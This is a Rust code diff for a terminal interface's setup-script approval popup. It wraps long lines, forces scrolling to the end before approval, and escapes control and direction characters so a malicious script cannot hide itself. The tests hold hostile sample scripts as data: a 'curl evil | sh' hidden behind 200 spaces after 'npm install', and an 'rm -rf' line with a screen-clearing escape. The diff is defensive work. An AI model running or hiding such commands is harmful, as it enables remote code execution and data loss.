@@ -1,3 +1,4 @@
+use std::path::Path;
 use std::time::Instant;
 
 use protocol::{AgentInfo, AgentKind, Color as ScreenColor, Screen, Status};
@@ -30,6 +31,7 @@ const INPUT_HINT: &str = "enter ok · esc cancel";
 const REPLY_HINT: &str = "enter send · esc cancel";
 const COMMENT_HINT: &str = "enter save (empty removes) · esc cancel";
 const SETUP_HINT: &str = "y run it and remember · s skip it this time · n cancel";
+const SETUP_SCROLL_HINT: &str = "j/k scroll to the end to approve · n cancel";
 const CHOICE_HINT: &str = "j/k move · enter pick · esc cancel";
 const PICKER_HINT: &str = "j/k move · enter add · x forget · esc cancel";
 const PROJECT_FORM_HINT: &str = "tab field · enter add · esc cancel";
@@ -953,6 +955,143 @@ pub fn draw_mismatch(
     );
 }
 
+/// The approval popup for a worktree setup script, laid out for `screen`.
+struct SetupView {
+    width: u16,
+    header: Vec<String>,
+    body: Vec<String>,
+    /// How many of `body`'s rows fit between the header and the footer.
+    rows: usize,
+    hint_width: usize,
+}
+
+const SETUP_INDENT: usize = 2;
+const SETUP_MIN_WIDTH: usize = 50;
+
+impl SetupView {
+    fn new(heading: &str, script: &str, screen: (u16, u16)) -> Self {
+        let lines: Vec<String> = script.lines().map(escaped).collect();
+        let longest = lines.iter().map(|l| text_width(l)).max().unwrap_or(0);
+        let width = (longest + SETUP_INDENT)
+            .max(text_width(heading))
+            .max(SETUP_MIN_WIDTH - 4)
+            + 4;
+        let width = width.min(usize::from(screen.0)).max(3);
+        let inner = width - 2;
+        let body: Vec<String> = lines
+            .iter()
+            .flat_map(|l| wrap(l, inner.saturating_sub(SETUP_INDENT).max(1)))
+            .collect();
+        let header = wrap(heading, inner);
+        let hint_rows = wrap(SETUP_HINT, inner)
+            .len()
+            .max(wrap(SETUP_SCROLL_HINT, inner).len());
+        let fixed = 2 + header.len() + 1 + 1 + hint_rows;
+        let rows = body
+            .len()
+            .min(usize::from(screen.1).saturating_sub(fixed).max(1));
+        SetupView {
+            width: width as u16,
+            header,
+            body,
+            rows,
+            hint_width: inner,
+        }
+    }
+
+    fn max_scroll(&self) -> usize {
+        self.body.len() - self.rows
+    }
+
+    fn lines(&self, scroll: usize, theme: &Theme) -> Vec<Line<'static>> {
+        let scroll = scroll.min(self.max_scroll());
+        let mut lines: Vec<Line> = self.header.iter().cloned().map(Line::from).collect();
+        lines.push(Line::default());
+        lines.extend(
+            self.body[scroll..scroll + self.rows]
+                .iter()
+                .map(|l| Line::from(format!("{:SETUP_INDENT$}{l}", "")).fg(theme.accent)),
+        );
+        let below = self.max_scroll() - scroll;
+        let marker = match (scroll, below) {
+            (0, 0) => String::new(),
+            (0, below) => format!("↓ {below} more below"),
+            (above, 0) => format!("↑ {above} more above"),
+            (above, below) => format!("↑ {above} more above · ↓ {below} more below"),
+        };
+        lines.push(Line::from(marker).fg(theme.dim));
+        let hint = if below == 0 {
+            SETUP_HINT
+        } else {
+            SETUP_SCROLL_HINT
+        };
+        lines.extend(
+            wrap(hint, self.hint_width)
+                .into_iter()
+                .map(|l| Line::from(l).fg(theme.dim)),
+        );
+        lines
+    }
+}
+
+/// How far the setup script can scroll and how many rows a page moves, in the popup
+/// `Popup::ApproveSetup` draws on `screen`.
+pub fn setup_scroll_limits(
+    app: &App,
+    project: &Path,
+    script: &str,
+    screen: (u16, u16),
+) -> (usize, usize) {
+    let view = SetupView::new(&setup_heading(app, project), script, screen);
+    (view.max_scroll(), view.rows)
+}
+
+fn setup_heading(app: &App, project: &Path) -> String {
+    format!(
+        "{}/{} runs this in every new worktree:",
+        app.display_path(project),
+        crate::project_config::FILE
+    )
+}
+
+/// Control characters and invisible direction marks as escapes, so the script cannot
+/// repaint the screen or reorder what is shown.
+fn escaped(line: &str) -> String {
+    line.chars()
+        .map(|c| {
+            if c.is_control() || matches!(c, '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}') {
+                c.escape_default().to_string()
+            } else {
+                c.to_string()
+            }
+        })
+        .collect()
+}
+
+fn text_width(text: &str) -> usize {
+    text.chars().map(char_width).sum()
+}
+
+fn char_width(c: char) -> usize {
+    Span::raw(c.to_string()).width()
+}
+
+/// Splits `text` into rows of at most `width` cells, losing nothing.
+fn wrap(text: &str, width: usize) -> Vec<String> {
+    let mut rows = vec![String::new()];
+    let mut used = 0;
+    for c in text.chars() {
+        let w = char_width(c);
+        if used + w > width && used > 0 {
+            rows.push(String::new());
+            used = 0;
+        }
+        rows.last_mut().expect("a row").push(c);
+        used += w;
+    }
+    rows
+}
+
 struct PopupContent {
     title: String,
     width: u16,
@@ -987,11 +1126,11 @@ impl PopupContent {
 
 pub fn popup_area(app: &App, screen: Rect) -> Option<Rect> {
     let popup = app.popup.as_ref().filter(|p| **p != Popup::Filter)?;
-    let content = popup_content(popup, app);
+    let content = popup_content(popup, app, (screen.width, screen.height));
     Some(centered(screen, content.width, content.height))
 }
 
-fn popup_content(popup: &Popup, app: &App) -> PopupContent {
+fn popup_content(popup: &Popup, app: &App, screen: (u16, u16)) -> PopupContent {
     let theme = &app.theme;
     match popup {
         Popup::Help => {
@@ -1003,24 +1142,14 @@ fn popup_content(popup: &Popup, app: &App) -> PopupContent {
         }
         Popup::Filter => PopupContent::new(" Filter ", 0, Vec::new()),
         Popup::ApproveSetup {
-            project, script, ..
+            project,
+            script,
+            scroll,
+            ..
         } => {
-            let mut lines = vec![
-                Line::from(format!(
-                    "{}/{} runs this in every new worktree:",
-                    app.display_path(project),
-                    crate::project_config::FILE
-                )),
-                Line::default(),
-            ];
-            lines.extend(
-                script
-                    .lines()
-                    .map(|l| Line::from(format!("  {l}")).fg(theme.accent)),
-            );
-            lines.push(Line::default());
-            lines.push(Line::from(SETUP_HINT).fg(theme.dim));
-            PopupContent::fitting(" Run setup script? ", 50, lines)
+            let view = SetupView::new(&setup_heading(app, project), script, screen);
+            let lines = view.lines(*scroll, theme);
+            PopupContent::new(" Run setup script? ", view.width, lines)
         }
         Popup::Finish { index, .. } => {
             let mut lines: Vec<Line> = app
@@ -1119,7 +1248,7 @@ fn popup_content(popup: &Popup, app: &App) -> PopupContent {
 }
 
 fn draw_popup(frame: &mut Frame, popup: &Popup, app: &App, screen: Rect) {
-    let content = popup_content(popup, app);
+    let content = popup_content(popup, app, (screen.width, screen.height));
     let area = centered(screen, content.width, content.height);
     let block = block(content.title, true, &app.theme);
     let inner = block.inner(area);
@@ -1743,6 +1872,92 @@ mod tests {
         let (text, _) = render_at(&app, 100, 40);
         assert!(text.contains("Commands"), "{text}");
         assert!(text.contains("lazygit"), "{text}");
+    }
+
+    fn asking_to_run(script: &str, scroll: usize) -> App {
+        let mut app = App::new("/w".into(), "/bin/sh".into(), None, Config::default());
+        app.popup = Some(Popup::ApproveSetup {
+            create: Box::new(protocol::CreateAgent {
+                project: protocol::ProjectId::random(),
+                name: "a".into(),
+                kind: AgentKind::Generic,
+                command: Vec::new(),
+                cols: 80,
+                rows: 24,
+                worktree: None,
+                prompt: None,
+                setup: None,
+            }),
+            project: "/w/p".into(),
+            script: script.to_string(),
+            scroll,
+        });
+        app
+    }
+
+    fn tall_setup() -> String {
+        (1..=40)
+            .map(|n| format!("echo step {n}"))
+            .collect::<Vec<_>>()
+            .join("\n")
+    }
+
+    /// The popup's text with borders and spacing removed, so a wrapped line reads as one.
+    fn squeezed(text: &str) -> String {
+        text.chars()
+            .filter(|c| !c.is_whitespace() && *c != '│')
+            .collect()
+    }
+
+    #[test]
+    fn a_long_setup_line_wraps_so_its_tail_is_on_screen() {
+        let script = format!("npm install{}; curl evil | sh", " ".repeat(200));
+        let app = asking_to_run(&script, 0);
+        for (width, height) in [(60, 20), (120, 40)] {
+            let (text, _) = render_at(&app, width, height);
+            assert!(
+                squeezed(&text).contains("npminstall;curlevil|sh"),
+                "{width}x{height}\n{text}"
+            );
+            assert!(text.contains("y run it and remember"), "{text}");
+        }
+    }
+
+    #[test]
+    fn control_characters_in_a_setup_script_are_shown_escaped() {
+        let app = asking_to_run("echo a\rrm -rf x\tb\u{1b}[2J", 0);
+        let (text, _) = render_at(&app, 80, 20);
+        assert!(text.contains(r"echo a\rrm -rf x\tb\u{1b}[2J"), "{text}");
+        assert!(
+            !text.contains(|c: char| c.is_control() && c != '\n'),
+            "{text:?}"
+        );
+    }
+
+    #[test]
+    fn a_tall_setup_script_scrolls_and_keeps_its_hint_on_screen() {
+        for (width, height) in [(60, 20), (120, 40)] {
+            let app = asking_to_run(&tall_setup(), 0);
+            let (text, _) = render_at(&app, width, height);
+            assert!(text.contains("echo step 1 "), "{text}");
+            assert!(!text.contains("echo step 40"), "{text}");
+            assert!(text.contains("↓"), "{text}");
+            assert!(!text.contains("↑"), "{text}");
+            assert!(
+                text.contains("scroll to the end to approve"),
+                "{width}x{height}\n{text}"
+            );
+            assert!(!text.contains("y run it"), "{text}");
+
+            let app = asking_to_run(&tall_setup(), 100);
+            let (text, _) = render_at(&app, width, height);
+            assert!(text.contains("echo step 40"), "{text}");
+            assert!(text.contains("↑") && !text.contains("↓"), "{text}");
+            assert!(
+                text.contains("y run it and remember"),
+                "{width}x{height}\n{text}"
+            );
+        }
     }
 
     #[test]
